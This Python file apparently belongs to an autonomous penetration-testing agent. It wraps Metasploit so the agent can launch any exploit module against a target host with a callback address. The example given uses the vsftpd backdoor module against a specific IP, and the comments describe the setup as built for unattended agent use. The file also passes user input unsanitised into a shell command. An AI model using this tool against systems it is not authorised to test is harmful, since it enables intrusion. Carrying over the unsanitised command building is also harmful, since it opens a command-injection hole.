# dawnyawn/tools/metasploit_tool.py
from tools.base_tool import BaseTool


class MetasploitTool(BaseTool):
    @property
    def name(self) -> str:
        return "metasploit_exploit"

    @property
    def description(self) -> str:
        return (
            "Executes a specific Metasploit exploit module against a target. "
            "WARNING: This is an active exploitation tool. Use it only when a vulnerability "
            "has been clearly identified. The input MUST be a comma-separated string in the format: "
            "exploit_module_name,RHOSTS_target,LHOST_callback_ip. "
            "Example: 'exploit/unix/ftp/vsftpd_234_backdoor,178.79.155.238,172.17.0.1'"
        )

    def _construct_command(self, tool_input: str) -> str:
        try:
            module, rhosts, lhost = tool_input.strip().split(',')

            # These commands will be executed sequentially by msfconsole.
            # -q is quiet mode. -x is execute commands.
            # 'exploit -j -z' runs the exploit as a job and doesn't interact on session creation,
            # which is critical for an autonomous agent.
            commands = f"use {module}; set RHOSTS {rhosts}; set LHOST {lhost}; exploit -j -z; exit"

            return f'msfconsole -q -x "{commands}"'

        except ValueError:
            return "echo 'Error: Invalid input format for metasploit_exploit. Expected: module,rhosts,lhost'"